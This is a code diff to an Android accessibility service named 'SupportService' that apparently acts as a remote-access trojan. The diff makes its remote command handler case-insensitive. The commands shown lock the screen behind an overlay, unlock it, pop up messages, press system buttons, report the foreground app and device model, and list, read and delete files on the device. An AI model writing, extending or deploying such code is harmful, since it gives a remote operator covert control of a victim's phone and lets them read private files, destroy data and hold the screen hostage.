@@ -115,8 +115,10 @@ public class SupportService extends AccessibilityService {
             String cmd = in.readLine();
 
             if (cmd == null) return;
+            
+            String cmdLower = cmd.toLowerCase().trim();
 
-            if (cmd.equals("LOCK")) {
+            if (cmdLower.equals("lock")) {
                 task_handler.post(() -> {
                     if (!isLocked) {
                         showOverlay();
@@ -124,7 +126,7 @@ public class SupportService extends AccessibilityService {
                     }
                 });
                 out.println("OK: Device Locked");
-            } else if (cmd.equals("UNLOCK")) {
+            } else if (cmdLower.equals("unlock")) {
                 task_handler.post(() -> {
                     if (isLocked) {
                         hideOverlay();
@@ -132,11 +134,11 @@ public class SupportService extends AccessibilityService {
                     }
                 });
                 out.println("OK: Device Unlocked");
-            } else if (cmd.startsWith("MESSAGE ")) {
+            } else if (cmdLower.startsWith("message ")) {
                 String msg = cmd.substring(8);
                 task_handler.post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show());
                 out.println("OK: Message Sent");
-            } else if (cmd.equals("VIBRATE")) {
+            } else if (cmdLower.equals("vibrate")) {
                 Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                 if (v != null) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -146,18 +148,18 @@ public class SupportService extends AccessibilityService {
                     }
                 }
                 out.println("OK: Vibrating");
-            } else if (cmd.equals("HOME")) {
+            } else if (cmdLower.equals("home")) {
                 performGlobalAction(GLOBAL_ACTION_HOME);
                 out.println("OK: Home Pressed");
-            } else if (cmd.equals("BACK")) {
+            } else if (cmdLower.equals("back")) {
                 performGlobalAction(GLOBAL_ACTION_BACK);
                 out.println("OK: Back Pressed");
-            } else if (cmd.equals("SCREEN")) {
+            } else if (cmdLower.equals("screen")) {
                 String pkg = (getRootInActiveWindow() != null) ? getRootInActiveWindow().getPackageName().toString() : "Unknown";
                 out.println("DATA: " + pkg);
-            } else if (cmd.equals("PWD")) {
+            } else if (cmdLower.equals("pwd")) {
                 out.println(currentPath);
-            } else if (cmd.startsWith("CD ")) {
+            } else if (cmdLower.startsWith("cd ")) {
                 String newPath = cmd.substring(3).trim();
                 File dir = new File(newPath.startsWith("/") ? newPath : currentPath + "/" + newPath);
                 if (dir.exists() && dir.isDirectory()) {
@@ -166,7 +168,7 @@ public class SupportService extends AccessibilityService {
                 } else {
                     out.println("ERROR: Not a directory");
                 }
-            } else if (cmd.startsWith("LS")) {
+            } else if (cmdLower.startsWith("ls")) {
                 String path = cmd.length() > 3 ? cmd.substring(3).trim() : currentPath;
                 File dir = new File(path.startsWith("/") ? path : currentPath + "/" + path);
                 if (dir.exists() && dir.isDirectory()) {
@@ -174,7 +176,7 @@ public class SupportService extends AccessibilityService {
                     if (files != null) {
                         StringBuilder sb = new StringBuilder();
                         for (File f : files) {
-                            sb.append(f.isDirectory() ? "[D] " : "[F] ").append(f.getName()).append("\n");
+                            sb.append(f.isDirectory() ? "[d] " : "[f] ").append(f.getName()).append("\n");
                         }
                         out.println(sb.toString().isEmpty() ? "Empty" : sb.toString());
                     } else {
@@ -183,7 +185,7 @@ public class SupportService extends AccessibilityService {
                 } else {
                     out.println("ERROR: Invalid Dir");
                 }
-            } else if (cmd.startsWith("CAT ")) {
+            } else if (cmdLower.startsWith("cat ")) {
                 String fileName = cmd.substring(4).trim();
                 File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                 if (f.exists() && f.isFile()) {
@@ -196,7 +198,7 @@ public class SupportService extends AccessibilityService {
                 } else {
                     out.println("ERROR: File not found");
                 }
-            } else if (cmd.startsWith("RM ")) {
+            } else if (cmdLower.startsWith("rm ")) {
                 String fileName = cmd.substring(3).trim();
                 File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                 if (f.exists() && f.delete()) {
@@ -204,7 +206,7 @@ public class SupportService extends AccessibilityService {
                 } else {
                     out.println("ERROR: Delete failed");
                 }
-            } else if (cmd.equals("INFO")) {
+            } else if (cmdLower.equals("info")) {
                 out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE);
             } else {
                 out.println("ERROR: Unknown Command");
